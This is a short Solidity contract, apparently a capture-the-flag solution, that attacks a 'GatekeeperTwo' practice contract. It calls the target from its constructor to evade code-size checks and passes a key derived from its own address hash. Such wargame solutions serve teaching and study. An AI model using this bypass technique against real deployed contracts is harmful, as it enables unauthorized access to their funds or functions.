// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";

contract GateTwoAttack {
    constructor(GatekeeperTwo _gate) public {
        uint64 key = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ (uint64(0) - 1);
        require(_gate.enter(bytes8(key)),"not able to enter");
    }
}
